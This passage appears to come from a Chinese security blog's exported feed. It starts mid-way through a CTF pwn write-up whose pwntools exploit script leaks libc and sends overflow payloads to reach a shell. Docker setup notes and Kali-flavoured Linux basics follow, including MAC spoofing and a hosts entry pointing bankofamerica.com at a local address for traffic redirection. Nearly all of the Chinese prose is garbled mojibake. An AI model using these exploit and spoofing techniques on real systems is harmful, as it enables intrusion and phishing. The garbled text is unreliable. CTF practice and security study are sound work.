class="string">'\xf7'</span>)[<span class="number">-5</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = base + <span class="number">0x3a819</span></span><br><span class="line"><span class="comment">#one_gadget = base + 0x3ac69</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">8</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span> + p32(ret) +p32(one_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰è£…Docker å’Œ Docker-Composeä»¥åŠdocker imagesçš„åˆ¶ä½œåŠä¸Šä¼ </title>
      <link href="/2019/11/01/docker%E5%92%8Cdocker-compose%E7%9A%84%E5%AE%89%E8%A3%85/"/>
      <url>/2019/11/01/docker%E5%92%8Cdocker-compose%E7%9A%84%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…Docker-å’Œ-Docker-Composeã€‚"><a href="#å®‰è£…Docker-å’Œ-Docker-Composeã€‚" class="headerlink" title="å®‰è£…Docker å’Œ Docker-Composeã€‚"></a>å®‰è£…Docker å’Œ Docker-Composeã€‚</h3><p>Dockerï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -<span class="keyword">y</span> yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"></span><br><span class="line">sudo yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span> docker-<span class="keyword">ce</span>-cli containerd.io</span><br><span class="line"></span><br><span class="line">yum <span class="keyword">list</span> docker-<span class="keyword">ce</span> --showduplicates | <span class="keyword">sort</span> -r</span><br><span class="line"></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span>-<span class="symbol">&lt;VERSION_STRING&gt;</span> docker-<span class="keyword">ce</span>-cli-<span class="symbol">&lt;VERSION_STRING&gt;</span> containerd.io</span><br><span class="line"><span class="keyword">e</span>.<span class="variable">g:</span></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span>-docker-<span class="keyword">ce</span>-<span class="number">18.09</span>.<span class="number">1</span> docker-<span class="keyword">ce</span>-cli-docker-<span class="keyword">ce</span>-<span class="number">18.09</span>.<span class="number">1</span> containerd.io</span><br><span class="line"></span><br><span class="line">sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p>Docker-Compose</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> python-pip</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade setuptools</span></span><br><span class="line">pip <span class="keyword">install</span> more-itertools==<span class="number">5.0</span><span class="number">.0</span></span><br><span class="line">pip <span class="keyword">install</span> docker-compose</span><br></pre></td></tr></table></figure><h3 id="docker-imagesçš„åˆ¶ä½œåŠä¸Šä¼ "><a href="#docker-imagesçš„åˆ¶ä½œåŠä¸Šä¼ " class="headerlink" title="docker imagesçš„åˆ¶ä½œåŠä¸Šä¼ "></a>docker imagesçš„åˆ¶ä½œåŠä¸Šä¼ </h3><h4 id="åˆ¶ä½œ"><a href="#åˆ¶ä½œ" class="headerlink" title="åˆ¶ä½œ"></a>åˆ¶ä½œ</h4><p>dockerfileå•¥çš„æ–‡ä»¶å¾—å…ˆå‡†å¤‡å¥½~</p><p>ç„¶åè¿›å…¥åˆ°æœ‰docker-compose.ymlæ–‡ä»¶çš„ç›®å½•</p><p><code>docker build -t ID/repo:tag ./</code></p><p>æ¯”å¦‚</p><p><code>docker build -t jayxv/dockerfiles:web1 ./</code></p><p>æŸ¥çœ‹ç¡®è®¤</p><p><code>docker images</code></p><h4 id="ç™»é™†dockerhub"><a href="#ç™»é™†dockerhub" class="headerlink" title="ç™»é™†dockerhub"></a>ç™»é™†dockerhub</h4><p><code>docker login</code></p><h4 id="ä¸Šä¼ è‡³dockerhub"><a href="#ä¸Šä¼ è‡³dockerhub" class="headerlink" title="ä¸Šä¼ è‡³dockerhub"></a>ä¸Šä¼ è‡³dockerhub</h4><p><code>docker push jayxv/dockerfiles:web1</code>ï¼ˆç¡®ä¿imageçš„IDå’Œä»“åº“åä¸ä½ çš„dockerhubä¸Šçš„è´¦æˆ·åä¸€è‡´~ï¼‰</p><h4 id="æ‹‰åˆ°æœ¬åœ°"><a href="#æ‹‰åˆ°æœ¬åœ°" class="headerlink" title="æ‹‰åˆ°æœ¬åœ°"></a>æ‹‰åˆ°æœ¬åœ°</h4><p><code>docker pull jayxv/dockerfiles:web1</code></p><h3 id="è¿è¡Œdocker"><a href="#è¿è¡Œdocker" class="headerlink" title="è¿è¡Œdocker"></a>è¿è¡Œdocker</h3><p>docker run -d -p 9999:9999 jayxv/dockerfiles:web1</p><h3 id="è¿›å…¥docker"><a href="#è¿›å…¥docker" class="headerlink" title="è¿›å…¥docker"></a>è¿›å…¥docker</h3><p>docker exec -it å®¹å™¨id /bin/sh </p><h3 id="å¯¼å‡ºé•œåƒ"><a href="#å¯¼å‡ºé•œåƒ" class="headerlink" title="å¯¼å‡ºé•œåƒ"></a>å¯¼å‡ºé•œåƒ</h3><p> docker save &gt; web1.tar jayxv/dockerfiles:web1</p><h3 id="å¯¼å…¥é•œåƒ"><a href="#å¯¼å…¥é•œåƒ" class="headerlink" title="å¯¼å…¥é•œåƒ"></a>å¯¼å…¥é•œåƒ</h3><p>docker load &lt;  web1.tar</p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux åŸºç¡€</title>
      <link href="/2019/09/12/Linux%20%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/09/12/Linux%20%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-æ–‡ä»¶ç³»ç»Ÿ"><a href="#Linux-æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Linux æ–‡ä»¶ç³»ç»Ÿ"></a>Linux æ–‡ä»¶ç³»ç»Ÿ</h2><p>é€»è¾‘æ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ï¼ˆ/ï¼‰ä½äºæ–‡ä»¶ç³»ç»Ÿç›®å½•æ ‘çš„é¡¶éƒ¨ï¼Œä»¥ä¸‹æ˜¯è¦äº†è§£çš„æœ€é‡è¦çš„å­ç›®å½•ï¼š </span><br><span class="line"><span class="string">/root</span> root ç”¨æˆ·çš„ä¸»ç›®å½• </span><br><span class="line"><span class="string">/etc</span> é€šå¸¸åŒ…å« Linux é…ç½®æ–‡ä»¶ - æ§åˆ¶ç¨‹åºå¯åŠ¨æ—¶é—´å’Œæ–¹å¼çš„æ–‡ä»¶ </span><br><span class="line"><span class="string">/home</span> ç”¨æˆ·çš„ä¸»ç›®å½• </span><br><span class="line"><span class="string">/mnt</span> å°†å…¶ä»–æ–‡ä»¶ç³»ç»Ÿé™„åŠ æˆ–å®‰è£…åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ä½ç½® </span><br><span class="line"><span class="string">/media</span> CD å’Œ USB è®¾å¤‡é€šå¸¸è¿æ¥æˆ–å®‰è£…åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ä½ç½® </span><br><span class="line"><span class="string">/bin</span> å…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆç›¸å½“äº Microsoft Windows ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ </span><br><span class="line"><span class="string">/lib</span> lib åº“æ–‡ä»¶ï¼ˆä¸ Windows DLL ç±»ä¼¼çš„å…±äº«ç¨‹åºï¼‰</span><br></pre></td></tr></table></figure><h2 id="LinuxåŸºæœ¬å‘½ä»¤"><a href="#LinuxåŸºæœ¬å‘½ä»¤" class="headerlink" title="LinuxåŸºæœ¬å‘½ä»¤"></a>LinuxåŸºæœ¬å‘½ä»¤</h2><p>pwd    æŸ¥çœ‹å½“å‰ç›®å½•</p><p>whoami    æŸ¥çœ‹ç™»å½•ç”¨æˆ·</p><p>cd    æ›´æ”¹ç›®å½•</p><p>ls    åˆ—å‡ºç›®å½•å†…å®¹</p><p>ls -l    åˆ—å‡ºç›®å½•è¾“å‡ºä¸ºé•¿åˆ—è¡¨</p><p>ls -aï¼ˆls -laï¼‰åˆ—å‡ºå†…å®¹åŒ…æ‹¬éšè—æ–‡ä»¶ã€</p><p>sth - help    è·å–å¸®åŠ©</p><p>man sth    ä½¿ç”¨manå¼•ç”¨æ‰‹å†Œé¡µ</p><h3 id="æœç´¢æŸ¥æ‰¾"><a href="#æœç´¢æŸ¥æ‰¾" class="headerlink" title="æœç´¢æŸ¥æ‰¾"></a>æœç´¢æŸ¥æ‰¾</h3><p>locate sth    æ­¤å‘½ä»¤å°†éå†æ•´ä¸ª æ–‡ä»¶ç³»ç»Ÿå¹¶æ‰¾åˆ°è¯¥å•è¯çš„æ¯ä¸ªåŒ¹é…é¡¹ã€‚ </p><p>whereis sth    æ­¤å‘½ä»¤ä¸ä»…è¿”å›äºŒè¿›åˆ¶æ–‡ä»¶çš„ä½ç½®ï¼Œè¿˜è¿” å›å…¶æºå’Œæ‰‹å†Œé¡µï¼ˆå¦‚æœå¯ç”¨ï¼‰ã€‚</p><p>which sth    åœ¨PATHå˜é‡ä¸­æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶</p><p>findï¼š</p><p>â€‹        è¯­æ³•ï¼šfind directory options expression </p><p>â€‹        ä¾‹ï¼šfind / -type f -name apache2.*            (fè¡¨ç¤ºæ™®é€šæ–‡ä»¶)</p><p>ps aux    æä¾›äº†åœ¨è¿™ä¸ªç³»ç»Ÿä¸­è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹çš„åˆ—è¡¨ </p><p>grep è¿‡æ»¤å…³é”®å­—ï¼ˆé…åˆç®¡é“ç¬¦ï¼‰</p><p>cat    æ˜¾ç¤ºæ–‡ä»¶</p><p>cat &gt;    åˆ›å»ºå°æ–‡ä»¶ï¼ˆCTRL-Dä¿å­˜ï¼‰</p><p>cat &gt;&gt;    é™„åŠ </p><p>touch filename    åˆ›å»ºåä¸ºfilenameçš„æ–‡ä»¶</p><p>mkdir \dirname    åˆ›å»ºç›®å½•</p><p>cp oldfilename path/newfilename    å¤åˆ¶æ–‡ä»¶</p><p>mv oldfile newfile    è¿‚å›é‡å‘½åæ–‡ä»¶</p><p>rm filename    åˆ é™¤æ–‡ä»¶</p><p>rmdir dirname    åˆ é™¤ç©ºç›®å½•</p><p>rm -r dirname    åˆ é™¤ç›®å½•åŠæ–‡ä»¶</p><p>head filename    æŸ¥çœ‹å¼€å¤´å‰ï¼ˆé»˜è®¤ï¼‰åè¡Œ</p><p>head -20 filename    æŸ¥çœ‹å¼€å¤´å‰20è¡Œ</p><p>tail filename    åŒheadï¼ŒæŸ¥çœ‹æ–‡ä»¶å°¾</p><p>nl filename    æ˜¾ç¤ºè¡Œå·</p><p>ä¾‹ï¼štail  -n+507  /etc/snort/snort.conf  |  head  -n  6</p><p>sed  æŸ¥æ‰¾å’Œæ›¿æ¢</p><p>ä¾‹ï¼šsed    s/mysql/MySQL/g  /etc/snort/snort.conf  &gt;  snort2.conf</p><p>s å‚æ•°æä¾›æœç´¢ï¼Œä½ å…ˆæä¾›æƒ³è¦æœç´¢çš„å…³é”®è¯ (mysql) ç„¶åæä¾›æƒ³è¦æ›¿æ¢æˆçš„å…³é”®è¯ (MySQL), ç”¨æ–œæ  (/)åˆ†å¼€ã€‚g å‚æ•°å‘Šè¯‰ Linux ä½ å¸Œæœ›å…¨å±€æ›¿æ¢ï¼Œç„¶åå°†ç»“æœä¿å­˜åˆ°ä¸€ä¸ªæ–°æ–‡ä»¶ snort2.confã€‚ </p><p>å¦‚æœä½ åªæƒ³æ›¿æ¢ç¬¬ä¸€ä¸ªå‡ºç°çš„ mysqlï¼Œä½ éœ€è¦å»æ‰æœ«å°¾çš„ g å‚æ•°ã€‚ </p><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ sed å‘½ä»¤æŸ¥æ‰¾æ›¿æ¢ç¬¬ä¸€ä¸ªå‡ºç°å­—æ®µä»¥å¤–çš„ä»»æ„ä½ç½®å‡ºç°çš„å­—æ®µã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³åªæ›¿æ¢ ç¬¬äºŒä¸ªå‡ºç°çš„ mysqlï¼Œ</p><p>sed  s/mysql/MySQL/2  snort.conf  &gt;  snort2.conf </p><p>more filename    æ§åˆ¶æ˜¾ç¤ºæ–‡ä»¶    enteré”®æ¢è¡Œ</p><p>less filename    æŒ‰ä¸‹æ–œæ é”®ï¼ˆ/ï¼‰ï¼Œ è¾“å…¥ï¼ˆoutputï¼‰ï¼Œè¿™ä¼šç«‹å³å°†ä½ å¸¦åˆ°ç¬¬ä¸€ä¸ªå‡ºç° output çš„åœ°æ–¹ï¼Œå¹¶ä¸”é«˜äº®äº† outputã€‚ç„¶åä½ å¯ä»¥æŒ‰ n é”®ï¼ˆnextï¼‰åˆ°ä¸‹ä¸€ ä¸ªå‡ºç° ï¼ˆoutput ï¼‰çš„åœ°æ–¹ã€‚ </p><h2 id="åˆ†æå’Œç®¡ç†ç½‘ç»œ"><a href="#åˆ†æå’Œç®¡ç†ç½‘ç»œ" class="headerlink" title="åˆ†æå’Œç®¡ç†ç½‘ç»œ"></a>åˆ†æå’Œç®¡ç†ç½‘ç»œ</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>eth0ï¼ˆEthernet0ï¼‰ç¬¬ä¸€ä¸ªæœ‰çº¿ä»¥å¤ªç½‘æ¥å£</p><p>Ethernet     ä»¥å¤ªç½‘</p><p>HWaddr    æ¯ä¸ªç½‘ç»œç¡¬ä»¶ä¸Šæ ‡è®°çš„å…¨å±€å”¯ä¸€æ ‡è®°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç½‘ç»œæ¥å£å¡ network interface card (NIC), é€šå¸¸æŒ‡çš„æ˜¯åª’ä½“è®¿é—®æ§åˆ¶ media access control (MAC) åœ°å€ã€‚ </p><p>inet addr    åˆ†é…IPåœ°å€ä¿¡æ¯çš„ç½‘ç»œæ¥å£     </p><p>Bcast    å¹¿æ’­åœ°å€ï¼Œç”¨äºå‘å­ç½‘ä¸Šçš„æ‰€æœ‰ IP å‘é€ä¿¡æ¯çš„åœ°å€;</p><p>Mask    å­ç½‘æ©ç ï¼Œç”¨äºç¡®å®š IP åœ° å€çš„å“ªä¸ªéƒ¨åˆ†è¿æ¥åˆ°æœ¬åœ°ç½‘ç»œ</p><p>lo     ç¯å›åœ°å€ï¼ˆloopback addressï¼‰    å¹¶ä¸”æœ‰æ—¶ç§°ä¸º localhost    è¿™æ˜¯ä¸ªç‰¹æ®Šçš„è½¯ä»¶åœ°å€ï¼Œå¯å¸®åŠ©ä½ è¿æ¥åˆ°è‡ªå·±çš„ç³»ç»Ÿã€‚æœªåœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„è½¯ä»¶å’ŒæœåŠ¡å°† æ— æ³•è¢«ä½¿ç”¨ã€‚ä½ å¯ä»¥ä½¿ç”¨ lo åœ¨ä½ çš„ç³»ç»Ÿæµ‹è¯•æŸäº›å†…å®¹ï¼Œä¾‹å¦‚ä½ è‡ªå·±çš„ web æœåŠ¡å™¨ã€‚æœ¬åœ°ä¸»æœºé€šå¸¸ç”¨ IP åœ° å€ 127.0.0.1 è¡¨ç¤ºã€‚ </p><p>wlan0    åªæœ‰å½“æ‹¥æœ‰æ— çº¿æ¥å£æˆ–é€‚é…å™¨æ—¶ï¼Œæ‰ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚è¯·æ³¨æ„ï¼Œå®ƒè¿˜ ä¼šæ˜¾ç¤ºè¯¥è®¾å¤‡ (HWaddr)çš„ MAC åœ°å€ã€‚ </p><p>æ¥è‡ª ifconfig çš„æ­¤ä¿¡æ¯ä½¿æ‚¨å¯ä»¥è¿æ¥å¹¶æ“ä½œå±€åŸŸç½‘ (LAN) è®¾ç½®ï¼Œè¿™æ˜¯é»‘å®¢æ”»å‡»çš„åŸºæœ¬æŠ€èƒ½ï¼ˆå†…ç½‘ç©¿é€ä¹ˆï¼Ÿï¼‰</p><h3 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;iwconfig </span><br><span class="line">wlan0 IEEE 802.11bg ESSID:off/any </span><br><span class="line">Mode:Managed Access Point: <span class="keyword">Not</span> Associated <span class="attribute">Tx-Power</span>=20 dBm </span><br><span class="line">Â­Â­snip-- </span><br><span class="line">lo <span class="literal">no</span><span class="built_in"> wireless </span>extensions  </span><br><span class="line">eth0 <span class="literal">no</span><span class="built_in"> wireless </span>extensions</span><br></pre></td></tr></table></figure><p>å¯¹äº wlan0ï¼Œæˆ‘ä»¬äº†è§£äº†æˆ‘ä»¬çš„è®¾å¤‡èƒ½å¤Ÿæ”¯æŒçš„ 802.11 IEEE æ— çº¿æ ‡å‡†ï¼šb å’Œ g ï¼Œ ä¸¤ç§æ—©æœŸçš„æ— çº¿é€š ä¿¡æ ‡å‡†ã€‚ç°åœ¨å¤§å¤šæ•°æ— çº¿è®¾å¤‡ä¹ŸåŒ…æ‹¬ n ( n æ˜¯æœ€æ–°çš„æ ‡å‡†)ã€‚ </p><p>æˆ‘ä»¬è¿˜ä» iwconfig ä¸­å­¦ä¹ äº†æ— çº¿æ‰©å±•çš„æ¨¡å¼(æœ¬ä¾‹ä¸­ä¸º Mode:Manageï¼Œä¸åŒäº monitor æˆ– promiscuous mode)ã€‚åœ¨ç ´è§£æ— çº¿å¯†ç æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°æ··æ‚æ¨¡å¼(promiscuous mode)ã€‚ </p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°æ— çº¿ç½‘å¡ï¼ˆé€‚é…å™¨ï¼‰æœªè¿æ¥ï¼ˆæœªå…³è”ï¼‰åˆ°æ¥å…¥ç‚¹ (AP) ï¼Œå¹¶ä¸”å…¶åŠŸç‡ä¸º 20 dBmï¼Œ è¿™è¡¨ç¤ºä¿¡å·å¼ºåº¦ã€‚ </p><h3 id="æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯"><a href="#æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯" class="headerlink" title="æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯"></a>æ›´æ”¹ä½ çš„ç½‘ç»œä¿¡æ¯</h3><p>ifconfig  eth0  192.168.181.115  netmask  255.255.0.0  broadcast  192.168.1.255     </p><p>ä½¿ç”¨ ifconfig å‘½ä»¤æ”¹å˜ä½ çš„IPï¼Œå­ç½‘æ©ç ï¼Œå¹¿æ’­åœ°å€</p><p>ä¼ªè£…MACï¼ˆ HWaddr ï¼‰åœ°å€ï¼š</p><p>â€‹        ç®€å•åœ°ä½¿ç”¨ ifconfig å‘½ä»¤çš„ down é€‰é¡¹æ¥å…³é—­è¯¥æ¥å£ </p><p>â€‹        ç„¶åè¾“å…¥ ifconfig å‘½ä»¤å¹¶åŠ ä¸Šæ¥å£åç§° (hw è¡¨ç¤ºç¡¬ä»¶ï¼Œether è¡¨ç¤ºä»¥å¤ªç½‘) å’Œæ–°çš„ä¼ªé€  MAC åœ° </p><p>â€‹        æœ€åï¼Œä½¿ç”¨é€‰é¡¹ up å¤‡ä»½æ¥å£ä»¥è¿›è¡Œæ›´æ”¹ã€‚ </p><p>ä¾‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">down</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">hw</span>  <span class="selector-tag">ether</span>  00<span class="selector-pseudo">:11</span><span class="selector-pseudo">:22</span><span class="selector-pseudo">:33</span><span class="selector-pseudo">:44</span><span class="selector-pseudo">:55</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure><p>dhclient  eth0     ä» DHCPæœåŠ¡å™¨åˆ†é…æ–°çš„ IPåœ°å€</p><p>dig hackers-arise.com ns    (nameserver çš„ç¼©å†™ï¼‰ä»ä¸€ä¸ªåŸŸåæœåŠ¡å™¨è·å–ä¿¡æ¯ </p><p>åœ¨ ADDITIONAL SECTION éƒ¨åˆ†ï¼Œdig æŸ¥è¯¢æ˜¾ç¤ºäº†ä¸º hackersÂ­arise.com æä¾›æœåŠ¡çš„ DNS æœåŠ¡ å™¨çš„ IP åœ°å€</p><p>dig hackers-arise.com mx    è·å–ç”µå­é‚®ä»¶æœåŠ¡å™¨ä¿¡æ¯</p><p>æ›´æ”¹DNSæœåŠ¡å™¨</p><p>leafpad  /etc/resolv.conf         ç„¶åæ–‡ä¸­æ·»åŠ     nameserver 8.8.8.8 </p><p>or</p><p>echo  â€œnameserver  8.8.8.8â€  &gt;&gt;  /etc/resolv.conf </p><p>ï¼ˆä½ çš„æœºå™¨ç°åœ¨å°†è½¬åˆ° Google å…¬å…± DNS æœåŠ¡å™¨æ¥è§£æåŸŸåæˆ IP åœ°å€ã€‚ï¼‰</p><p>æ˜ å°„æ‚¨è‡ªå·±çš„IPåœ°å€ï¼ˆä½ å¯ä»¥å†³å®šæµè§ˆå™¨å°†è®¿é—®å“ªä¸ª IP åœ°å€è€Œä¸æ˜¯è®© DNS æœåŠ¡å†³å®šï¼‰</p><p><strong>å¯¹äºé»‘å®¢ï¼Œè¿™å¯¹äºåŠ«æŒå±€åŸŸç½‘ä¸Šçš„ TCP è¿æ¥ä»¥ä½¿ç”¨ dnsspoof ç­‰å·¥å…·å°†æµé‡å®šå‘åˆ°æ¶æ„ Web æœåŠ¡ å™¨éå¸¸æœ‰ç”¨ã€‚</strong> </p><p>192.168.181.131    bankofamerica.com ï¼ˆåœ¨ IP åœ°å€å’ŒåŸŸåä¸­é—´è¯·ç¡®ä¿ä½ è¾“å…¥çš„æ˜¯ TAB é”®ï¼‰</p><h2 id="æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶"><a href="#æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶" class="headerlink" title="æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶"></a>æ·»åŠ æˆ–åˆ é™¤è½¯ä»¶</h2><p>apt-cache search [snort]     æœç´¢è½¯ä»¶åŒ…</p><p>apt-get  install  [snort]    æ·»åŠ è½¯ä»¶</p><p>apt-get  remove  [snort]    åˆ é™¤è½¯ä»¶    ï¼ˆä¸åˆ é™¤é…ç½®æ–‡ä»¶ï¼‰</p><p>apt-get purge [snort ]    åˆ é™¤è½¯ä»¶åŠå…¶é…ç½®æ–‡ä»¶</p><p>apt-get update     æ›´æ–°ç³»ç»Ÿ</p><p>apt-get upgrade     å‡çº§åº“ä¸­çš„åŒ…</p><p>â€‹            æ·»åŠ è½¯ä»¶ä»“åº“åˆ° SOURCES.LIST æ–‡ä»¶ ï¼š</p><p>â€‹            kali &gt;leafpad  /etc/apt/sources.list </p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu trusty main  </span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu precise main</span></span><br></pre></td></tr></table></figure><p>â€‹            å…¶ä¸­</p><p>â€‹            main     åŒ…å«å—æ”¯æŒçš„å¼€æºè½¯ä»¶<br>â€‹            universe     åŒ…å«ç¤¾åŒºç»´æŠ¤çš„å¼€æºè½¯ä»¶<br>â€‹            multiverse     åŒ…å«å—ç‰ˆæƒæˆ–å…¶ä»–æ³•å¾‹é—®é¢˜é™åˆ¶çš„è½¯ä»¶<br>â€‹            restricted     åŒ…å«ä¸“æœ‰è®¾å¤‡é©±åŠ¨ç¨‹åº<br>â€‹            backports     åŒ…å«æ¥è‡ªåç»­ç‰ˆæœ¬çš„</p><p> git clone url</p><h2 id="æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™"><a href="#æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™" class="headerlink" title="æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™"></a>æ§åˆ¶æ–‡ä»¶å’Œç›®å½•æƒé™</h2><h3 id="æƒé™ï¼š"><a href="#æƒé™ï¼š" class="headerlink" title="æƒé™ï¼š"></a>æƒé™ï¼š</h3><p>å¿…é¡»ä¸ºæ¯ä¸ªæ–‡ä»¶å’Œç›®å½•åˆ†é…ä½¿ç”¨å®ƒçš„ä¸åŒèº«ä»½çš„ç‰¹å®šçº§åˆ«çš„æƒé™ã€‚ä¸‰ä¸ªçº§åˆ«çš„è®¸å¯å¦‚ä¸‹ï¼š </p><p>r   è¯»æƒé™ã€‚èµ‹äºˆç”¨æˆ·æ‰“å¼€ä¸æŸ¥çœ‹æƒé™<br>w  å†™æƒé™ã€‚èµ‹äºˆç”¨æˆ·æŸ¥çœ‹ä¸ç¼–è¾‘å†™å…¥æƒé™<br>x  æ‰§è¡Œæƒé™ã€‚èµ‹äºˆç”¨æˆ·æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ï¼ˆä½†æ˜¯æ²¡æœ‰å¿…è¦æŸ¥çœ‹æˆ–è€…ç¼–è¾‘å®ƒï¼‰</p><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œroot ç”¨æˆ·å¯ä»¥æ ¹æ®ç”¨æˆ·éœ€è¦çš„æƒé™å‘ç”¨æˆ·æˆäºˆä¸€å®šçº§åˆ«çš„æƒé™ã€‚åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œé€šå¸¸åˆ› å»ºæ–‡ä»¶çš„ç”¨æˆ·æ˜¯æ–‡ä»¶çš„æ‰€æœ‰è€…ï¼Œç”¨æˆ·ç»„æ˜¯ç”¨æˆ·çš„å½“å‰ç»„ã€‚è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…å¯ä»¥æˆäºˆå®ƒå„ç§è®¿é—®æƒé™ã€‚è®©æˆ‘ ä»¬çœ‹çœ‹å¦‚ä½•æ›´æ”¹æƒé™ä»¥å°†æ‰€æœ‰æƒèµ‹äºˆç»™å•ä¸ªç”¨æˆ·å’Œç»„ã€‚ </p><p>chown user filename    èµ‹äºˆä¸ªäººç”¨æˆ·æƒé™</p><p>chgrp group filename    èµ‹äºˆç”¨æˆ·ç»„æƒé™</p><h3 id="æ£€æŸ¥æƒé™-ls-l"><a href="#æ£€æŸ¥æƒé™-ls-l" class="headerlink" title="æ£€æŸ¥æƒé™    ls -l"></a>æ£€æŸ¥æƒé™    ls -l</h3><p>ä¾‹ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;ls  â€“l  /usr/share/hashcat </span><br><span class="line">total<span class="number"> 32952 </span></span><br><span class="line">âŠâ‹         âŒ  â  â â           â </span><br><span class="line">drwxr-xr-x <span class="number"> 5 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 charsets 